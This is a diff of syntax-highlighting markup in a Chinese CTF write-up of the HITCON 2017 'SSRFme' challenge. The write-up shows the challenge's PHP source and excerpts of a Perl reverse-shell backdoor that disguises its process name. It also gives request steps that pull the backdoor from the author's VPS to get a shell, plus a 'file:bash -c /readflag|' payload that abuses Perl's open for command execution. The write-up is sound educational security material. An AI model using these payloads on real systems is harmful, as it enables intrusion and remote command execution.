@@ -98,11 +98,11 @@
 <p>题目给出了源码:</p>
 
 <div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span> 
-    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="s2">"sandbox/"</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"orange"</span> <span class="o">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]);</span> 
+    <span class="nv">$sandbox</span> <span class="o">=</span> <span class="s2">"sandbox/"</span> <span class="mf">.</span> <span class="nb">md5</span><span class="p">(</span><span class="s2">"orange"</span> <span class="mf">.</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">"REMOTE_ADDR"</span><span class="p">]);</span> 
     <span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span> 
     <span class="o">@</span><span class="nb">chdir</span><span class="p">(</span><span class="nv">$sandbox</span><span class="p">);</span> 
 
-    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"GET "</span> <span class="o">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"url"</span><span class="p">]));</span> 
+    <span class="nv">$data</span> <span class="o">=</span> <span class="nb">shell_exec</span><span class="p">(</span><span class="s2">"GET "</span> <span class="mf">.</span> <span class="nb">escapeshellarg</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"url"</span><span class="p">]));</span> 
     <span class="nv">$info</span> <span class="o">=</span> <span class="nb">pathinfo</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s2">"filename"</span><span class="p">]);</span> 
     <span class="nv">$dir</span>  <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">"."</span><span class="p">,</span> <span class="s2">""</span><span class="p">,</span> <span class="nb">basename</span><span class="p">(</span><span class="nv">$info</span><span class="p">[</span><span class="s2">"dirname"</span><span class="p">]));</span> 
     <span class="o">@</span><span class="nb">mkdir</span><span class="p">(</span><span class="nv">$dir</span><span class="p">);</span> 
@@ -205,7 +205,7 @@ rr师傅:https://ricterz.me/posts/HITCON%202017%20SSRFme</p>
 <span class="k">my</span> <span class="nv">$fake_process_name</span> <span class="o">=</span> <span class="p">"</span><span class="s2">/usr/sbin/apache</span><span class="p">";</span>
 
 <span class="c1"># Change the process name to be less conspicious</span>
-<span class="nv">$0</span> <span class="o">=</span> <span class="p">"</span><span class="s2">[httpd]</span><span class="p">";</span>
+<span class="err">$</span><span class="mi">0</span> <span class="o">=</span> <span class="p">"</span><span class="s2">[httpd]</span><span class="p">";</span>
 
 <span class="c1"># Authenticate based on source IP address if required</span>
 <span class="k">if</span> <span class="p">(</span><span class="nb">defined</span><span class="p">(</span><span class="nv">$ENV</span><span class="p">{'</span><span class="s1">REMOTE_ADDR</span><span class="p">'}))</span> <span class="p">{</span>
@@ -267,13 +267,13 @@ rr师傅:https://ricterz.me/posts/HITCON%202017%20SSRFme</p>
 
 <span class="c1"># Form HTTP response using all the messages gathered by cgiprint so far</span>
 <span class="k">sub </span><span class="nf">cgiprintpage</span> <span class="p">{</span>
-    <span class="k">print</span> <span class="p">"</span><span class="s2">Content-Length: </span><span class="p">"</span> <span class="o">.</span> <span class="nb">length</span><span class="p">(</span><span class="nv">$global_page</span><span class="p">)</span> <span class="o">.</span> <span class="p">"</span><span class="se">\r</span><span class="s2"> Connection: close</span><span class="se">\r</span><span class="s2"> Content-Type: text</span><span class="err">\</span><span class="s2">/html</span><span class="se">\r\n\r\n</span><span class="p">"</span> <span class="o">.</span> <span class="nv">$global_page</span><span class="p">;</span>
+    <span class="k">print</span> <span class="p">"</span><span class="s2">Content-Length: </span><span class="p">"</span> <span class="o">.</span> <span class="nb">length</span><span class="p">(</span><span class="nv">$global_page</span><span class="p">)</span> <span class="o">.</span> <span class="p">"</span><span class="se">\r</span><span class="s2"> Connection: close</span><span class="se">\r</span><span class="s2"> Content-Type: text</span><span class="se">\</span><span class="s2">/html</span><span class="se">\r\n\r\n</span><span class="p">"</span> <span class="o">.</span> <span class="nv">$global_page</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div></div>
 
-<p>然后请求<code class="highlighter-rouge">/?url=自己的vps的perl后门路径&amp;filename=URI/pr0ph3t.pm</code>
+<p>然后请求<code class="language-plaintext highlighter-rouge">/?url=自己的vps的perl后门路径&amp;filename=URI/pr0ph3t.pm</code>
 在沙箱文件夹的URI目录下写入反弹shell的pm文件
-最后监听某个端口后请求<code class="highlighter-rouge">/?url=pr0ph3t://pr0ph3t.com&amp;filename=xxx</code>即可收到shell
+最后监听某个端口后请求<code class="language-plaintext highlighter-rouge">/?url=pr0ph3t://pr0ph3t.com&amp;filename=xxx</code>即可收到shell
 <img src="/assets/images/posts/2018/hitcon2017-SSRF-Me复现/1.png" alt="shell" /></p>
 <ul>
   <li>第二个是perl的open命令有可能会导致命令执行
@@ -339,11 +339,11 @@ which DOES contain “foo” will be written to “result.txt”.</p>
 <span class="c1">#第47行</span>
     <span class="c1"># test file exists and is readable</span>
     <span class="k">unless</span> <span class="p">(</span><span class="o">-</span><span class="nv">e</span> <span class="nv">$path</span><span class="p">)</span> <span class="p">{</span>
-	<span class="k">return</span> <span class="nn">HTTP::</span><span class="nv">Response</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span> <span class="o">&amp;</span><span class="nn">HTTP::Status::</span><span class="nv">RC_NOT_FOUND</span><span class="p">,</span>
+	<span class="k">return</span> <span class="nn">HTTP::</span><span class="nv">Response</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span> <span class="nv">&amp;</span><span class="nn">HTTP::Status::</span><span class="nv">RC_NOT_FOUND</span><span class="p">,</span>
 				  <span class="p">"</span><span class="s2">File `</span><span class="si">$path</span><span class="s2">' does not exist</span><span class="p">");</span>
     <span class="p">}</span>
     <span class="k">unless</span> <span class="p">(</span><span class="o">-</span><span class="nv">r</span> <span class="nv">_</span><span class="p">)</span> <span class="p">{</span>
-	<span class="k">return</span> <span class="nn">HTTP::</span><span class="nv">Response</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span> <span class="o">&amp;</span><span class="nn">HTTP::Status::</span><span class="nv">RC_FORBIDDEN</span><span class="p">,</span>
+	<span class="k">return</span> <span class="nn">HTTP::</span><span class="nv">Response</span><span class="o">-&gt;</span><span class="k">new</span><span class="p">(</span> <span class="nv">&amp;</span><span class="nn">HTTP::Status::</span><span class="nv">RC_FORBIDDEN</span><span class="p">,</span>
 				  <span class="p">'</span><span class="s1">User does not have read permission</span><span class="p">');</span>
     <span class="p">}</span>
 <span class="o">...</span>
@@ -351,7 +351,7 @@ which DOES contain “foo” will be written to “result.txt”.</p>
     <span class="c1"># read the file</span>
     <span class="k">if</span> <span class="p">(</span><span class="nv">$method</span> <span class="ow">ne</span> <span class="p">"</span><span class="s2">HEAD</span><span class="p">")</span> <span class="p">{</span>
 	<span class="nb">open</span><span class="p">(</span><span class="nv">F</span><span class="p">,</span> <span class="nv">$path</span><span class="p">)</span> <span class="ow">or</span> <span class="k">return</span> <span class="k">new</span>
-	    <span class="nn">HTTP::</span><span class="nv">Response</span><span class="p">(</span><span class="o">&amp;</span><span class="nn">HTTP::Status::</span><span class="nv">RC_INTERNAL_SERVER_ERROR</span><span class="p">,</span>
+	    <span class="nn">HTTP::</span><span class="nv">Response</span><span class="p">(</span><span class="nv">&amp;</span><span class="nn">HTTP::Status::</span><span class="nv">RC_INTERNAL_SERVER_ERROR</span><span class="p">,</span>
 			   <span class="p">"</span><span class="s2">Cannot read file '</span><span class="si">$path</span><span class="s2">': $!</span><span class="p">");</span>
 	<span class="nb">binmode</span><span class="p">(</span><span class="nv">F</span><span class="p">);</span>
 	<span class="nv">$response</span> <span class="o">=</span>  <span class="nv">$self</span><span class="o">-&gt;</span><span class="nv">collect</span><span class="p">(</span><span class="nv">$arg</span><span class="p">,</span> <span class="nv">$response</span><span class="p">,</span> <span class="k">sub </span><span class="p">{</span>
@@ -366,8 +366,8 @@ which DOES contain “foo” will be written to “result.txt”.</p>
 </code></pre></div></div>
 
 <p>首先得满足前面的文件存在, 才会继续到open语句, 所以在执行命令前得保证有相应的同名文件, 所以先请求
-<code class="highlighter-rouge">/?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code> 创建相应的同名文件
-<code class="highlighter-rouge">/?url=file:bash -c /readflag|&amp;filename=123</code> 利用open的feature执行代码
+<code class="language-plaintext highlighter-rouge">/?url=file:bash -c /readflag|&amp;filename=bash -c /readflag|</code> 创建相应的同名文件
+<code class="language-plaintext highlighter-rouge">/?url=file:bash -c /readflag|&amp;filename=123</code> 利用open的feature执行代码
 最后直接访问<strong>/sandbox/哈希值/123</strong>就能得到flag</p>
 
 <p>(安利一个文本查找工具https://blog.lilydjwg.me/tag/AG)</p>
